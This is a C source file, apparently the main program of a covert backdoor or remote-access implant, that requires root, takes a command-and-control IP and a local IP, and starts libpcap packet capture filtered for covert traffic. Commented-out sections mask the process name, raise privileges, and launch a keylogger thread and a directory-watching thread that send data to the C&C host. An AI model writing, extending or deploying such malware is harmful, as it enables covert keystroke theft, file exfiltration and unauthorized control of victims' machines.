#include <getopt.h>
#include <pthread.h>
#include "../src/encrypt_utils.h"
#include "../src/socketwrappers.h"
#include "../src/covert_wrappers.h"
#include "../src/inotify.h"
#include "../src/libpcap.h"
#include "../src/keylogger.h"

static void print_usage(void) {
    puts ("Usage options: \n"
            "\t--nic      -   network interface to use\n"
            "\t--target   -   target machine to attack\n"
            "\t--local    -   your local ip\n"
            "\t--tcp      -   use TCP protocol\n");
}

static struct option long_options[] = {
    {"nic",     required_argument,  0,  0 },
    {"target",  required_argument,  0,  1 },
    {"local",   required_argument,  0,  2 },
    {"tcp",     optional_argument,  0,  3 },
    {0,         0,                  0,  0 }
};

int main(int argc, char **argv){
    //strcpy(argv[0], MASK);
    //change the UID/GID to 0 to raise privs
    //setuid(0);
    //setgid(0);
    pthread_t inotify_thread;
    int arg;
    char cnc_ip[BUFSIZ];
    char local_ip[BUFSIZ];
    struct filter Filter;
    char pcapfilter[BUFSIZ];
    bool tcp = false;

    if(geteuid() != 0) {
        printf("Must run as root\n");
        exit(1);
    }

    while (1) {
        int option_index = 0;

        arg = getopt_long(argc, argv, "", long_options, &option_index);

        if(arg == -1) {
            break;
        }

        switch (arg) {
            case 0:
                /*strncpy(nic, optarg, BUFFERSIZE);
                printf("Using NIC: %s\n", nic);*/
                break;
            case 1:
                strncpy(cnc_ip, optarg, BUFSIZ);
                printf("TARGET IP: %s\n", cnc_ip);
                break;
            case 2:
                strncpy(local_ip, optarg, BUFSIZ);
                printf("LOCAL IP: %s\n", local_ip);
                break;
            case 3:
                tcp = true;
                break;
            default: /*  '?' */
                print_usage();
                exit(1);
        }
    }
/*
    //keylogger thread
    keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
    strncpy(keylogger_args->cnc_ip, cnc_ip, BUFSIZ);
    strncpy(keylogger_args->infected_ip, local_ip, BUFSIZ);
    pthread_t keylogger_thread; //create a thread
    pthread_create(&keylogger_thread, NULL, keylogger_send, keylogger_args);

    //create the inotify thread
    inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
    strncpy(inotify_args->targetip, cnc_ip, BUFSIZ);
    strncpy(inotify_args->localip, local_ip, BUFSIZ);
    inotify_args->tcp = tcp;
    pthread_create(&inotify_thread, NULL, watch_directory,inotify_args);
*/
    //start capturing packets
    Filter = InitFilter(cnc_ip,local_ip, true);
    CreateFilter(Filter, pcapfilter,tcp);
    printf("Filter: %s\n",pcapfilter);
    Packetcapture(pcapfilter,Filter,tcp);

 //   pthread_join(keylogger_thread, NULL);
  //  pthread_join(inotify_thread, NULL);

    return 0;
}
